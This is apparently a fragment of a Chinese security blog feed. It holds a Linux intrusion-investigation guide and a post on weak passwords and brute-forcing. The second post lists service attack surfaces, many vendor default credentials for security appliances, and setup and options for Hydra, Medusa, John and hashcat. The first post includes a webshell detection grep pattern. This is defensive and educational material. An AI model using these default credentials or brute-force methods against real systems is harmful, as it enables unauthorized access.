    <title><![CDATA[Linux入侵排查实战技巧]]></title>
    <url>%2Fposts%2F10024%2F</url>
    <content type="text"><![CDATA[本文总结Linux服务器入侵排查的通用思路与技巧... 0x01 系统排查1. 系统信息12345678910111213141516171819$ lscpu #查看CPU信息$ uname -a #操作系统信息$ cat /proc/version #系统版本信息$ cat /etc/redhat-release #查看系统发行版$ lsmod #查看模块信息$ lsblk #列出块设备信息$ ifconfig eth0 | grep -w inet #显示网卡IP信息$ curl cip.cc #查看主机公网IP信息$ hostname #查看系统主机名称$ cat /etc/resolv.conf #DNS配置查看 2. 用户账号123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051(1) 查看系统用户信息$ cat /etc/passwd用户名:密码加密:用户ID:用户组ID:注释:用户主目录:默认登录shell最后一列：/bin/bash表示用户状态可登录; /sbin/nologin表示账户状态不可登录(2) 查询超级权限账户: UID为0$ awk -F: &apos;&#123;if($3==0)print $1&#125;&apos; /etc/passwd(3) 查看可登录账户$ grep &apos;/bin/bash&apos; /etc/passwd(4) 查看空口令账户$ awk -F: &apos;length($2)==0 &#123;print $1&#125;&apos; /etc/shadow(5) 登录信息查看$ lastlog | more #查看用户最后登录信息$ lastb | more #显示用户错误的登录信息$ last | more #查看用户最近登录信息$ uptime #查看登陆多久、多少用户，负载$ who #查看当前登录用户（tty本地登陆 pts远程登录）$ w #查看系统信息，想知道某一时刻用户的行为 /var/log/wtmp: 存储登录成功的信息 /var/log/btmp: 存储登录失败的信息 /var/log/utmp: 存储当前正在登录的信息(6) 查看除root账号外其他帐号是否存在sudo权限$ more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;(7) 禁用或删除多余及可疑的帐号$ usermod -L user #禁用帐号，帐号无法登录，/etc/shadow第二栏为!开头$ userdel user #删除user用户$ userdel -r user #将删除user用户，并且将/home目录下的user目录一并删除 3. 启动项12345$ cat /etc/init.d/rc.local$ cat /etc/rc.local$ ls -alt /etc/init.d/ | head 4. 定时任务crontab -u &lt;-l, -r, -e&gt; 1234-u 指定一个用户-l 列出某个用户的任务计划-r 删除某个用户的任务-e 编辑某个用户的任务 123$ crontab -u root -l # 列出root用户的任务计划$ ls /etc/cron* # 查看/etc目录下任务计划相关文件 重点关注目录 123456789/var/spool/cron/*/etc/crontab/etc/cron.d/*/etc/cron.daily/*/etc/cron.hourly/*/etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/* 0x02 进程排查1. 进程查看netstat/ss 分析可疑端口、可疑IP、可疑PID及程序进程 1234567891011$ sudo netstat -ltpe | more # 查看监听中的网络连接并显示进程ID、进程所有者用户名$ sudo netstat -antp | grep &quot;ESTABLISHED&apos;&apos; # 查看正在通信中的连接信息$ sudo netstat -antpe # -n 和 -e 选项连用，显示进程所有者的用户ID 号$ netstat -ts # 打印出tcp协议下的收发包数量等统计数据$ watch -d -n0 &quot;netstat -atnp | grep &quot;ESTA&quot; # 监视active状态的连接$ ss -plat # 检查哪些进程在监听端口 ps 1234567$ ps -elf | grep pid # 以长格式显示系统中的进程信息$ ps -aux --sort -pcpu | less # 根据cpu使用率进行排序$ ps -aux --sort -pmem | less # 根据内存使用来升序排序$ ps -axjf # 以树形结构显示进程 top 动态查看进程状态, 可分析CPU占用较高的进程, 排查挖矿木马 实用选项 1234567-c: 显示完整命令-d： 设置信息更新时间, 以秒为单位-u&lt;用户名&gt;：指定用户名-p&lt;进程号&gt;：显示指定进程信息 交互命令 123456789101112131415161718192021b： 高亮显示当前运行进程c： 切换显示命令名称和完整命令行M： 根据驻留内存大小进行排序P： 根据CPU使用百分比大小进行排序T： 根据时间/累计时间进行排序i： 忽略闲置和僵死进程，这是一个开关式命令s： 改变两次刷新之间的延迟时间（单位为s）l： 切换显示平均负载和启动时间信息m： 切换显示内存信息t： 切换显示进程和CPU状态信息w： 将当前设置写入~/.toprc文件中 pstree 以树状图的方式展现进程之间的派生关系 实用选项 123456789-a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示-h：列出树状图时，特别标明现在执行的程序-l：采用长列格式显示树状图-p：显示程序识别码-u：显示用户名称 lsof 查看进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP) 12345678910111213141516171819202122232425$ lsof -p pid # 查看指定进程ID已打开的内容$ lsof -i # 显示所有连接$ lsof -i:port # 查看与指定端口相关的网络信息$ lsof -i@ip # 查看与指定IP相关的网络信息$ lsof -i -sTCP:LISTEN # 找出正等待连接的端口$ lsof -i | grep -i ESTABLISHED # 找出已经建立的连接$ lsof -u user # 使用-u显示指定用户打开哪些文件$ lsof -u ^root # 查看除指定用户以外的其它所有用户所做的事情$ lsof -c command # 查看指定的命令正在使用的文件和网络连接$ lsof | grep deleted # 查看被删除的文件信息$ kill -9 `lsof -t -u user` # 杀死指定用户运行的所有进程$ lsof -u user -i @ip # 显示用户user连接到指定IP所做的一切$ lsof +L1 # 显示所有打开的链接数小于1的文件，多表示某个攻击者正尝试通过删除文件入口来隐藏文件内容 /proc 文件系统 1Linux 内核提供了一种通过 proc 文件系统，在运行时访问内核内部数据结构、改变内核设置的机制，它以文件系统的方式为访问系统内核数据的操作提供接口，用户和应用程序可以通过 proc 得到系统的信息 进程相关项 12345678910111213141516171819202122232425/proc/N pid为N的进程信息/proc/N/cmdline 进程启动命令/proc/N/cwd 链接到进程当前工作目录/proc/N/environ 进程环境变量列表/proc/N/exe 链接到进程的执行命令文件/proc/N/fd 包含进程相关的所有的文件描述符/proc/N/maps 与进程相关的内存映射信息/proc/N/mem 指代进程持有的内存，不可读/proc/N/root 链接到进程的根目录/proc/N/stat 进程的状态/proc/N/statm 进程使用的内存的状态/proc/N/status 进程状态信息，比stat/statm更具可读性/proc/self 链接到当前正在运行的进程 隐藏进程显示 12345step 1: ps -ef | awk &apos;&#123;print&#125;&apos; | sort -n | uniq &gt;1step 2: ls /proc | sort -n | uniq &gt;2step 3: diff 1 2 2. 进程删除1234567891011$ kill -9 pid #强制终止进程$ killall name #依据进程名称杀死进程$ killall -u user #杀死指定用户的进程$ pkill name #杀死指定进程名的进程$ ps -elf | grep &apos;root&apos; | grep &apos;&#123;*&#125;&apos; | grep -v grep | xargs kill -STOP # 针对因存在守护进程无法删除的情况，可先把进程挂起，查杀守护进程后，再将进程删除$ lsattr file / chattr -i file / rm -rf file #针对设置了不可更改权限的文件，先移除i属性，再进行删除 3. 调试分析strace 跟踪进程执行时的系统调用和所接收的信号,可跟踪用户进程与 Linux内核之间的交互 1系统调用system call是程序从内核请求服务的一种编程方式，系统调用进入内核，使用trap机制从用户空间切换到内核空间，通过使用glibc系统库完成系统调用 123456789101112131415$ strace -p `pidof AliYunDun` # 依据pid跟踪进程正在进行的系统调用$ strace -o trace.log ls testdir/ #将输出记录到文件中$ strace -v ls testdir #在每个系统调用中提供附加信息\$ strace -f ls testdir #对当前正在跟踪的进程创建的任何子进程进行跟踪$ strace -e open ls testdir #使用-e标志跟上系统调用的名称$ strace -e write,getdents ls testdir #查看多个系统调用$ strace -t ls testdir/ #查看所有的系统调用的时间戳$ strace -r ls testdir/ #显示执行每个系统调用所花费的时间 ltrace 库调用跟踪器,用来跟踪进程调用库函数的情况 1234567891011121314用法：ltrace [option ...] [command [arg ...]]-d 打印调试信息-f 跟踪子进程-i 打印指令指针，当库调用时-p PID 附着在值为PID的进程号上进行ltrace-S 显示系统调用-T 输出每个调用过程的时间开销 pstack 显示每个进程的栈跟踪 1$ pstack pid #pstack 命令必须由相应进程的属主或 root 运行,唯一选项是要检查的进程的 PID 0x03 服务排查12345678910111213141516171819$ chkconfig --list #查看系统运行的服务 # 0-6表示等级 1 单用户模式 2 无网络连接的多用户命令模式 3 有网络连接的多用户命令模式 4 表示不可用 5 带图形界面的多用户模式 6 重新启动$ service --status-all | grep running ｜ more #显示正在运行的服务$ systemctl list-unit-files | grep enabled | more #列出 systemd 下正在运行服务 0x04 文件痕迹1. 敏感目录123456789(1) 临时目录/tmp、/var/tmp、/dev/shm下的文件，目录权限是1777，容易被上传木马文件(2) 命令目录/usr/bin、/usr/sbin等下的二进制文件容易被替换，替换后可下载busybox使用被替换命令$ ls -alt /usr/bin | head #按照最新修改时间显示，排查可疑文件(3) ~/.ssh、/etc/ssh 经常作为一些后门配置的路径，需重点排查$ cat ~/.ssh/authorized_keys #检查公钥是存在否异常注入 2. 时间点查找123456789101112列出攻击日志内变动的文件,排查恶意软件$ ls --full-time ./ | sed -n &apos;/2019-01-01/p&apos; #查找当前文件夹下的某个日期产生的文件$ find / -ctime 0 -name &quot;.sh&quot; #查找一天内新增的sh文件 -type b/c/d/f/l/p: 查找快设备、字符设备、目录、普通文件、符号链接、管道 -mtime -n +n # 按文件更改时间来查找文件，-n 指 n 天以内，+n 指 n 天前 -atime -n +n # 按文件访问时间来查找文件，-n 指 n 天以内，+n 指 n 天前 -ctime -n +n # 按文件创建时间来查找文件，-n 指 n 天以内，+n 指 n 天前$ find /tmp -type f -amin -10 -print #打印出10分钟内访问的所有文件 3. 文件大小搜索123$ find / -size -1223124c -size +1223122c -exec ls -id &#123;&#125; \; #搜索1223123大小的文件，盖茨木马$ find /usr/bin -type f -size 2k # 查找大小等于2KB的文件 4. 特殊文件webshell匹配 1$ find /var/www/ -name &quot;*.php&quot; |xargs egrep &apos;assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\&quot;\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode&apos; 特殊权限文件查找 123$ find /tmp -perm 777 # 打印出权限为777的文件, -perm选项指明find应该只匹配具有特定权限值的文件$ find / -type f -user root -print # 打印出用户root拥有的所有文件, 选项-user USER找出由某个特定用户所拥有的文件 隐藏文件查找 1$ ls -art /var/www/html | grep &quot;^\.&quot; # 查找web目录下以&quot;.&quot;开头的具有隐藏属性的文件 5. SUID程序1$ find / -type f -perm -04000 -ls -uid 0 2&gt;/dev/null 6. 二进制文件分析12345678910111213(1) file: 确定文件类型(2) ldd: 打印共享对象依赖关系, 即查询可执行程序所依赖的库和所在路径(3) strings: 打印二进制文件中的可打印字符的字符串(4) readelf: 显示有关ELF文件的信息(5) hexdump: 以 ASCII、十进制、十六进制或八进制显示文件内容(6) objdump: 从对象文件中显示信息，读取二进制或可执行文件，并将汇编语言指令转储到屏幕上(7) nm: 列出对象文件中的符号，从二进制文件中识别变量和函数 http://www.skyfree.org/linux/references/ELF_Format.pdf https://github.com/radareorg/radare2 0x05 日志分析1. 日志介绍日志默认存放位置：/var/log/ 查看日志配置情况：less /etc/rsyslog.conf 日志文件 说明 /var/log/cron 系统定时任务相关的日志 /var/log/secure 记录用户登录验证和授权的信息，涉及账号和密码的程序都会记录 /var/log/auth.log 记录系统授权信息，如用户登录和权限机制等 /var/log/btmp 记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看 /var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看 /var/log/wtmp 永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件，使用last命令来查看 /var/log/utmp 记录当前已经登录的用户信息，用w,who,users等命令来查询 /var/log/dmesg 记录系统在开机时内核自检的信息 /var/log/messages 记录系统启动后的信息和错误日志 2. 登录分析1234567891011(1) 登录成功IP统计$ grep -i Accepted /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more(2) 查看登录成功的日期、用户名、IP$ grep &quot;Accepted&quot; /var/log/secure | awk &apos;&#123;print $1,$2,$3,$9,$11&#125;&apos;(3) 定位有多少IP在爆破主机的root帐号$ grep &quot;Failed password for root&quot; /var/log/secure | awk &apos;&#123;print $11&#125;&apos; | sort | uniq -c | sort -nr | more 3. Web日志分析Apache 日志 1234567891011(1) apache日志文件位置/var/log/httpd/access.log # Red Hat/CentOS Apache访问日志位置/var/log/apache2/access.log # Debian/Ubuntu Apache访问日志文件位置(2) 日志位置定位$ grep -i CustomLog /etc/httpd/conf/httpd.conf$ locate access.log access_log | grep httpd$ locate access.log access_log | grep apache Nginx 日志 123456789日志定位$ yum install mlocate &amp;&amp; updatedb #安装locate所在文件包并更新搜索数据库$ locate access.log | grep nginx #定位nginx访问日志$ locate error.log | grep nginx #定位nginx错误日志$ grep &apos;access.log&apos; `locate nginx.conf` #根据配置文件定位日志 日志分析技巧 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647(1) 列出当天访问次数最多的10个IP$ awk -F &apos;-&apos; &apos;&#123;print $1&#125;&apos; log_file | uniq -c | sort -rn | head -10(2) 查看当天有多少个IP访问$ awk &apos;&#123;print $1&#125;&apos; log_file | sort -u | wc -l(3) 查看每一个IP访问了多少个页面：$ awk &apos;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&apos; log_file(4) 将每个IP访问的页面数进行从小到大排序：$ awk &apos;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&apos; log_file | sort -n(5) 查看某一个IP访问了哪些页面：$ grep ^1.1.1.1 log_file| awk &apos;&#123;print $1,$7&#125;&apos;(6) 去掉搜索引擎统计当天的页面$ awk &apos;&#123;print $12,$1&#125;&apos; log_file | grep ^\&quot;Mozilla | awk &apos;&#123;print $2&#125;&apos; |sort | uniq | wc -l(7) 查看2018年11月11日11时这一个小时内有多少IP访问awk &apos;&#123;print $4,$1&#125;&apos; log_file | grep 11/Nov/2018:11 | awk &apos;&#123;print $2&#125;&apos;| sort -u | wc -l(8) IP 统计$ grep &apos;11/Nov/2018&apos; /tmp/myid.access.log | awk &apos;&#123;print $1&#125;&apos; | awk -F&apos;.&apos; &apos;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&apos; | sort | uniq -c | sort -r -n | head -n 10(9) 网段统计$ cat /www/logs/www/access.2018-11-11.log | awk &apos;&#123;print $1&#125;&apos; | awk -F&apos;.&apos; &apos;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&apos; | sort | uniq -c | sort -r -n | head -n 20(10) 统计浏览器$ cat /www/logs/example.com/access.2018-11-11.log | grep -v -E &apos;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&apos; | sort | uniq -c | sort -r -n | head -n 100 | more(11) URL访问量统计$ cat /www/logs/access.2018-11-11.log | awk &apos;&#123;print $7&#125;&apos; | egrep &apos;\?|&amp;&apos; | sort | uniq -c | sort -rn | more(12) 删除一个月前日志$ rm -f /www/logs/access.log.$(date -d &apos;-1 month&apos; +&apos;%Y-%m&apos;)* 0x06 工具总结1. BusyboxBusybox 静态编译，可检测劫持了动态链接库的隐藏病毒 安装运行 12345$ wget https://busybox.net/downloads/binaries/1.30.0-i686/busybox$ chmod +x busybox$ ./busybox commond 2. Rootkit查杀chkrootkit Linux下rootkit检测工具 下载运行 123456789101112131415$ wget ftp://ftp.pangeia.com.br/pub/seg/pac/chkrootkit.tar.gz$ tar zxf chkrootkit.tar.gz$ cd chkrootkit-*$ make sense$ cd ..$ cp -r chkrootkit- /usr/local/chkrootkit$ rm -r chkrootkit-$ /usr/local/chkrootkit/chkrootkit rkhunter 一款用于检测Liunx系统是否感染rootkit的工具 下载运行 1234567$ wget https://jaist.dl.sourceforge.net/project/rkhunter/rkhunter/1.4.6/rkhunter-1.4.6.tar.gz$ tar zxvf rkhunter-1.4.6.tar.gz$ cd rkhunter-1.4.4$ ./install.sh --install rootkit检测 123$ rkhunter –checkall #执行rootkit预定库，来检测本地系统文件$ rkhunter --checkall --skip-keypress #--skip-keyperss参数来自动持续检测，一直到结束 3. 病毒查杀ClamAV Linux平台上的开源反病毒引擎，病毒库较丰富，更新频率高 下载运行 1234567$ yum install epel-release -y$ yum -y install clamav$ freshclam # 更新病毒库$ clamscan -r /opt # 扫描目录 病毒库更新 123456$ cd /var/lib/clamav$ wget http://database.clamav.net/main.cvd$ wget http://database.clamav.net/daily.cvd$ wget http://database.clamav.net/bytecode.cvd $ chown clamav:clamav * 4. 威胁取证 virustotal: https://www.virustotal.com/gui/home threatbook: https://x.threatbook.cn/ redqueen: https://redqueen.tj-un.com/IntelHome.html 5. webshell查杀 linux-malware-detect a malware scanner for Linux released Web Shell Detector find and identify php/cgi(perl)/asp/aspx shells WEBDIR+ 百度OpenRASP团队推出的一款WebShell检测引擎 http://webshell.cdxy.me/ Deep Learning model for PHP webshell detection https://www.shellpub.com/ 河马，专注webshell查杀研究 http://edr.sangfor.com.cn/backdoor_detection.html 深信服Webshell检测工具 6. 审计检查Lynis：用于UNIX系统的安全审计工具 1234567$ lynis show commands # 查看 Lynis 中所有可用的命令$ lynis audit system # 审计系统的安全状况，返回一份详细的报告 Lynis 使用颜色编码使报告更容易解读 绿色：一切正常 黄色：跳过、未找到，可能有个建议 红色：你可能需要仔细看看这个 7. 工具合集R-FX NETWORKS | Awesome-incident-response | Awesome-malware-analysis]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Incident Response</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[弱口令及爆破技术浅析]]></title>
    <url>%2Fposts%2F10235%2F</url>
    <content type="text"><![CDATA[从威胁及漏洞视角,弱口令漏洞影响广泛、利用成本低而效果奇佳,本文研究常见弱口令漏洞类型及爆破利用方式... 0x01 攻击面弱口令爆破常用端口及服务总结如下： 端口 服务 爆破方式 21 ftp/tftp/vsftpd文件传输协议 爆破/嗅探/溢出/后门 22 ssh远程连接 爆破/OpenSSH漏洞 23 Telnet远程连接 爆破/嗅探 25 SMTP邮件服务 邮件伪造 53 DNS域名解析系统 DNS区域传输/劫持/缓存投毒/欺骗; 利用DNS隧道技术刺透防火墙 67/68 dhcp服务 劫持/欺骗 69 tftp(简单文件传输协议,无认证) 尝试下载目标重要配置文件 110 pop3 爆破/嗅探 137/139 Samba服务 爆破/未授权访问/远程代码执行 143 Imap协议 爆破 161 SNMP协议 爆破/搜集目标内网信息 389 Ldap目录访问协议 注入/未授权访问/弱口令/匿名访问 445 smb ms17-010/端口溢出 512/513/514 Linux Rexec服务 爆破/Rlogin登陆 873 Rsync服务 文件上传/匿名访问 1080 socket 爆破/内网渗透 1099 JAVA RMI 反序列化远程命令执行漏洞 1194 openvpn 获取vpn账号,进内网 1352 Lotus domino邮件服务 爆破/弱口令/信息泄漏 1433 mssql 爆破/注入攻击/提权/sa弱口令 1500 ispmanager主机控制面板 弱口令 1521 oracle 注入攻击/TNS爆破/弹shell 1723 pptp 爆破/获取vpn账号,进内网 2049 Nfs服务 配置不当 2082,2083 cpanel主机管理面板登录 弱口令 2181 zookeeper服务 未授权访问 2375 docker remote api 未授权访问 2601,2604 zebra路由 默认密码zerbra 3128 squid代理服务 弱口令 3306 mysql 爆破/注入/拒绝服务/提取 3389 Rdp远程桌面连接 爆破/shift后门/ms12-020 3690 svn服务 svn泄露/未授权访问 4848 GlassFish控制台 爆破/认证绕过 5000 sybase/DB2数据库 爆破/注入 5432 postgresql 爆破/注入/缓冲区溢出 5632 pcanywhere服务 拒绝服务/代码执行 5900,5901,5902 vnc 弱口令爆破 5984 CouchDB 未授权访问导致任意指令执行 6379 Redis数据库 未授权访问/爆破 6443 Kubernetes API Server 未授权访问 7001/7002 weblogic java反序列化/控制台弱口令/控制台上传webshell/SSRF 80-89,443 http/https web应用漏洞/OpenSSL心脏滴血 8000 JDWP 远程命令执行漏洞 8069 zabbix服务 远程命令执行/注入 8080-8089 Jboss/Tomcat/Jenkins/Resin/Jetty 控制台弱口令/反序列化/远程文件读取 8083/8086 influxDB 未授权访问 8161 ActiveMQ 弱口令/任意文件写入/反序列化 9000 fastcgi 远程命令执行 9080-9081,9090 Websphere控制台 java反序列化/弱口令 9200/9300 elasticsearch 未授权访问/远程代码执行 11211 memcached 未授权访问 27017/27018 mongodb 未授权访问/爆破 50000 SAP 远程代码执行 50070,50030 hadoop 默认端口未授权访问 Refer: http://www.91ri.org/15441.html 0x02 爆破字典1. 厂商初始口令网络安全设备 设备 默认账号 初始密码 深信服设备 sangfor sangfor、sangfor@2019、sangfor@2020 深信服科技 AD sangfor dlanrecover 深信服负载均衡AD 3.6 admin admin 深信服WAC ( WNS V2.6) admin admin 深信服VPN Admin Admin 深信服ipsec-VPN (SSL 5.5) Admin Admin 深信服AC6.0 admin admin SANGFOR防火墙 admin sangfor 深信服AF(NGAF V2.2) admin sangfor 深信服NGAF下一代应用防火墙(NGAF V4.3) admin admin 深信服AD3.9 admin admin 深信服上网行为管理设备数据中心 Admin 密码为空 SANGFOR_AD_v5.1 admin admin 网御漏洞扫描系统 leadsec leadsec 天阗入侵检测与管理系统 V7.0 Admin、Audit、adm venus70 天阗入侵检测与管理系统 V6.0 Admin、Audit、adm venus60 网御WAF集中控制中心(V3.0R5.0) admin、audit、adm leadsec.waf 联想网御 administrator administrator 网御事件服务器 admin admin123 联想网御防火墙PowerV administrator administrator 联想网御入侵检测系统 lenovo default 网络卫士入侵检测系统 admin talent 网御入侵检测系统V3.2.72.0 adm、admin leadsec32 联想网御入侵检测系统IDS root 111111 联想网御入侵检测系统IDS admin admin123 科来网络回溯分析系统 csadmin colasoft 中控考勤机web3.0 administrator 123456 H3C iMC admin admin H3C SecPath系列 admin admin H3C S5120-SI test 123 H3C智能管理中心 admin admin H3C ER3100 admin adminer3100 H3C ER3200 admin adminer3200 H3C ER3260 admin adminer3260 H3C admin adminer H3C admin admin H3C admin h3capadmin H3C h3c h3c 360天擎 admin admin 网神防火墙 firewall firewall 天融信防火墙NGFW4000 superman talent 黑盾防火墙 admin admin 黑盾防火墙 rule、audit abc123 华为防火墙 telnetuser telnetpwd 华为防火墙 ftpuser ftppwd 方正防火墙 admin admin 飞塔防火墙 admin 密码为空 Juniper_SSG__5防火墙 netscreen netscreen 中新金盾硬件防火墙 admin 123 kill防火墙(冠群金辰) admin sys123 天清汉马USG防火墙 admin venus.fw 天清汉马USG防火墙 Audit venus.audit 天清汉马USG防火墙 useradmin venus.user 阿姆瑞特防火墙 admin manager 山石网科 hillstone hillstone 绿盟安全审计系统 weboper weboper 绿盟安全审计系统 webaudit webaudit 绿盟安全审计系统 conadmin conadmin 绿盟安全审计系统 admin admin 绿盟安全审计系统 shell shell 绿盟产品 nsfocus123 TopAudit日志审计系统 superman talent LogBase日志管理综合审计系统 admin safetybase 网神SecFox运维安全管理与审计系统 admin !1fw@2soc#3vpn 天融信数据库审计系统 superman telent Hillstone安全审计平台 hillstone hillstone 网康日志中心 ns25000 ns25000 网络安全审计系统（中科新业） admin 123456 天玥网络安全审计系统 Admin cyberaudit 明御WEB应用防火墙 admin admin、adminadmin 明御攻防实验室平台 root 123456 明御安全网关 admin adminadmin 明御运维审计与册风险控制系统 admin 1q2w3e 明御运维审计与册风险控制系统 system、auditor、operator 1q2w3e4r 明御网站卫士 sysmanager sysmanager888 亿邮邮件网关 eyouuser eyou_admin 亿邮邮件网关 eyougw admin@(eyou) 亿邮邮件网关 admin +-ccccc 亿邮邮件网关 admin cyouadmin Websense邮件安全网关 administrator admin 梭子鱼邮件存储网关 admin admin More: https://github.com/ihebski/DefaultCreds-cheat-sheet 2. 爆破字典合集 Weakpass 多种类型的爆破字典合集 fuzzDicts Web Pentesting Fuzz字典，适用于中国环境 SecLists-Passwords 包含众多密码列表的字典合集 Default Credentials Cheat Sheet 网络及安全设备默认口令 Free Rainbow Tables 基于彩虹表的字典合集 List of Rainbow Tables 基于彩虹表的字典合集 3. 字典生成工具 pydictor 一款强大用于暴力破解的字典生成器 CUPP 依据个人信息生成专属字典 CeWL 通过收集企业信息生成专属字典 0x03 爆破实战1. 爆破工具 Hydra 在线开源密码破解工具，支持多种协议类型及不同形式的WEB表单认证破解 Medusa 在线开源密码破解工具，支持多种协议，稳定性较高 ncrack 由nmap项目共同维护的在线密码破解工具，速度和稳定性较高 crowbar 在线密码破解工具，支持OpenVPN以及基于密钥方式身份认证的SSH、VNC服务 BruteSpray 可自动读取和解析nmap的扫描报告，并从中识别出可进行密码破解的服务类型 x-crack 一款基于Go语言的常见服务弱口令扫描器 John the Ripper 离线密码破解工具，可自动识别并解密200多种加密算法和应用 hashcat 开源离线密码破解工具，特性全面，速度较快 mimikatz windows系统凭据收集框架，凭据包括账号密码、HASH、证书、令牌、cookie等众多类型信息 Ophcrack 基于彩虹表的免费Windows密码破解程序 RainbowCrack 可生成用于密码破解的彩虹表 2. 在线爆破a. Hydra安装 12345$ git clone https://github.com/vanhauser-thc/thc-hydra.git$ cd thc-hydra$ ./configure &amp;&amp; make &amp;&amp; make install 常用参数 选项 用途 -l 指定单个用户名，适合在知道用户名爆破用户名密码时使用 -L 指定多个用户名，参数值为存储用户名的文件的路径 -p 指定单个密码，适合在知道密码爆破用户名时使用 -P 指定多个密码，参数值为存贮密码的文件(通常称为字典)的路径 -C 当用户名和密码存储到一个文件时使用此参数。字典文件存储的格式必须为 “用户名:密码” 的格式 -M 指定多个攻击目标，此参数为存储攻击目标的文件的路径，列表文件存储格式必须为”地址:端口” -t 指定爆破时的任务数量(线程数)，默认为16 -s 指定端口，适用于攻击目标端口非默认的情况 -S 指定爆破时使用 SSL 连接 -R 继续从上一次爆破进度上继续爆破 -v 显示爆破的详细信息 -f 一旦爆破成功一个就停止爆破 b. Medusa安装 123456789$ yum -y install libssh2-devel libssh2-devel libtool libtool-ltdl libtool-ltdl-devel$ yum groupinstall -y &apos;development tools&apos;$ wget http://foofus.net/goons/jmk/tools/medusa-2.2.tar.gz$ tar zxvf medusa-2.2.tar.gz &amp;&amp; cd medusa-2.2$ ./configure &amp;&amp; make &amp;&amp; make install 语法 1Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT] 参数选项 选项 用途 -h [TEXT] 目标主机名称或者IP地址 -H [FILE] 包含目标主机名称或者IP地址文件 -u [TEXT] 测试的用户名 -U [FILE] 包含测试的用户名文件 -p [TEXT] 测试的密码 -P [FILE] 包含测试的密码文件 -C [FILE] 组合条目文件 -O [FILE] 日志信息文件 -e [n/s/ns] n代表空密码，s代表为密码与用户名相同 -M [TEXT] 模块执行名称 -m [TEXT] 传递参数到模块 -d 显示所有的模块名称 -n [NUM] 使用非默认Tcp端口 -s 启用SSL -r [NUM] 重试间隔时间，默认为3秒 -t [NUM] 设定线程数量 -T 同时测试的主机总数 -L 并行化，每个用户使用一个线程 -f 在任何主机上找到第一个账号/密码后，停止破解 -F 在任何主机上找到第一个有效的用户名/密码后停止审计 -q 显示模块的使用信息 -v [NUM] 详细级别（0-6） -w [NUM] 错误调试级别（0-10） -V 显示版本 -Z [TEXT] 继续上一次扫描 3. 离线爆破a. John the Ripper安装 1234567$ wget https://www.openwall.com/john/k/john-1.9.0.tar.gz$ tar zxvf john-1.9.0.tar.gz &amp;&amp; cd john-1.9.0$ make &amp;&amp; make clean linux-x86-64$ alias john=&apos;/usr/local/john-1.9.0/run/john&apos; b. hashcat安装 12345$ wget https://hashcat.net/files/hashcat-6.1.1.tar.gz$ tar zxvf hashcat-6.1.1.tar.gz$ make &amp;&amp; make install 0x04 防御加固1. 缺陷总结123456789(1) 公共弱口令，出现频率比较高的弱口令(2) 数字或字母连排或混排，键盘字母连排(3) 默认密码，网络设备、系统组件等默认初始化弱口令(4) 生日，姓名+生日（利用社工非常容易被破解）(5) 短语密码（如：5201314，love1314等） 2. 口令设置12345678910111213141516（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令（2）口令长度不小于8 个字符（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词（6）口令不应该为用数字或符号代替某些字母的单词（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令\ 3. 防御策略123456789(1) 少用滚键盘类的密码，尽量使用难以猜解的密码(2) 防止信息泄漏导致密码泄漏或者可能易于被猜测: 登录名和用户名应进行区分；实行有效的密码策略，杜绝密码中包含用户名；不要使用易于从企业名称或者域名中得到密码信息的口令；防止GitHub信息泄漏(3) 禁止大量系统使用同一密码(4) 不要使用默认密码，密码默认即为密码公开(5) 撞库问题防范: 应定期修改密码，不同的网站或账户不应该使用相同的密码; 对登录进行有效验证限制、各个功能接口做检验 0x05 Reference https://hashcat.net/wiki/ https://nmap.org/ncrack/man.html https://www.openwall.com/john/doc/ https://www.hackingarticles.in/comprehensive-guide-on-hydra-a-brute-forcing-tool/ https://www.hackingarticles.in/beginner-guide-john-the-ripper-part-1/ https://www.hackingarticles.in/comprehensive-guide-on-medusa-a-brute-forcing-tool/ https://www.hackingarticles.in/beginners-guide-for-john-the-ripper-part-2/ 本文涉及内容，仅限于网络安全从业者学习交流，切勿用于非法用途...]]></content>
      <categories>
        <category>漏洞研究</category>
      </categories>
      <tags>
        <tag>Vulner</tag>
        <tag>Brute-force</tag>
        <tag>Init Access</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞详解]]></title>
    <url>%2Fposts%2F50059%2F</url>
